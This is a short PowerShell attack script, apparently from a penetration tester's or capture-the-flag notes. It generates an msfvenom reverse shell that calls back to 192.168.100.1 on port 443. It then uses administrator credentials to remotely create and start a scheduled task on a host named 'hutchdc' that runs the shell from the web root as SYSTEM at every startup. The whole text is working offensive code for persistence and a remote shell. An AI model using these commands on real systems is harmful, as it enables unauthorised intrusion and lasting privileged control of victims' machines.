# Create a Scheduled Task that runs as admin and creates runs rev shell

# Create Shell Using msfvenom -p windows/shell_reverse_tcp LHOST=192.168.100.1 LPORT=443 -f exe -o shell.exe

$pw = ConvertTo-SecureString "PASSWORD" -AsPlainText -Force

$creds = New-Object System.Management.Automation.PSCredential ("Administrator", $pw)

Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /create /sc onstart /tn shell /tr C:\inetpub\wwwroot\shell.exe /ru SYSTEM } -Credential $creds

Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /run /tn shell } -Credential $creds
